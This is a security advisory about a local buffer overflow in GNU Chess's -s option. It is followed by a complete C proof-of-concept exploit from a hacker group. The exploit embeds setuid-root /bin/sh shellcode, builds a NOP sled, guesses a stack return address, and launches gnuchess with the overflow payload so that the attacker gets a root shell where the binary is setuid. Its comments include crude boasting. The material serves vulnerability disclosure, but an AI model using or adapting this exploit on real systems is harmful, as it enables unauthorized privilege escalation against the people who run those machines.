source: http://www.securityfocus.com/bid/8097/info

A local buffer overflow has been reported for GNU Chess that may result in an attacker obtaining elevated privileges.

The vulnerability exists due to insufficient boundary checks performed on some commandline options.

Successful exploitation may result in the execution of attacker-supplied code. To be exploited for elevated privileges, the software must be setuid or setgid. Since GNU Chess is used as a back-end for some chess-related software, a situation could arise where it is invoked with user-supplied arguments by another program.

/*

  STX SECURITY LABS:
 
  5358gchessfuck.c - x86 local buffer overflow exploit
  proof of concept code by: ace [ ace@static-x.org ]
  vulnerability discovered by: t0asty [ t0asty@static-x.org ]
 
  Description:
 
  gnuchess is an updated version of the GNU chess playing program.
  It has a simple alpha-numeric board display, an IBM PC compatible  interface,
  or it can be compiled for use with the chesstool program on a SUN workstation
  or with the xboard program under X-windows.

  Vulnerability:

  A buffer overflow vulnerability resides in gnuchess.
  A segmentation fault occurs when 652 bytes of data are sent to
  the binary using the -s switch. The data overwrites the EIP therefore
  it allows us to control the pointer, allowing us to execute code.
  
  Versions vulnerable:

  [-] All versions are believed to be vulnerable.
      Tested on: Red Hat 7.3 with the latest version.

  **************************************************
  * Note: gnuchess may not be suid on all systems. *
  **************************************************

  StTtTTtTtTTtTtTTtTtTTtTtTTtTttTtTtTTtTtTTS
  X                                        X
  X STX ONLINE [ www.static-x.org ]        X
  X                                        X
  StTtTTtTtTTtTtTTtTtTTtTtTTtTttTtTtTTtTtTTS
 
  **************************************************
  * Note: our pen0rs are 50 x larger than yours.   *
  **************************************************
 
*/

#include <stdio.h>

char stxcode[] =

     /* ace's shellcode [ ace@static-x.org ] (setuid=0,/bin/sh) */
     "\x31\xdb\x89\xd8\xb0\x17\xcd\x80\xeb\x03\x5e\xeb\x05\xe8\xf8\xff"
     "\xff\xff\x83\xc6\x0d\x31\xc9\xb1\x50\x80\x36\x01\x46\xe2\xfa\xea"
     "\x09\x2e\x63\x68\x6f\x2e\x72\x69\x01\x80\xed\x66\x2a\x01\x01\x54"
     "\x88\xe4\x82\xed\x11\x57\x52\xe9\x01\x01\x01\x01\x5a\x80\xc2\xb6"
     "\x11\x01\x01\x8c\xb2\x2f\xee\xfe\xfe\xc6\x44\xfd\x01\x01\x01\x01"
     "\x88\x74\xf9\x8c\x4c\xf9\x30\xd3\xb9\x0a\x01\x01\x01\x52\x88\xf2"
     "\xcc\x81\x5a\x5f\xc8\xc2\x91\x91\x91\x91\x91\x91\x91\x91\x91";


unsigned long pen0r(void) 

{
 __asm__("movl %esp, %eax");
}

int main(int argc, char **argv) {
 
 int pos; int ace = pen0r(); int stxnop = 0x90;
 int stxbytes = 648; int stxtotal = stxbytes + 4;
 char *stxbof;
 stxbof = (char *)malloc(stxbytes); 

 for(pos = 0; pos < stxbytes; pos++) {*(long *)&stxbof[pos] = stxnop;}
 *(long *)&stxbof[stxbytes] = pen0r();
 memcpy(stxbof + stxbytes - strlen(stxcode), stxcode, strlen(stxcode));

 system("clear");
 printf("########################################\n");
 printf("#        [ STX SECURITY LABS ]         #\n");
 printf("#  gnuchess local poc exploit by: ace  #\n");
 printf("########################################\n\n");
 printf("[+] Return Address: 0x%x\n", ace);
 printf("[+] Buffer Size: %d\n", stxtotal);
 printf("[-] /usr/bin/gnuchess -s pwned!\n\n");

 execl("/usr/bin/gnuchess", "gnuchess", "-s", stxbof, NULL);

return 0;

}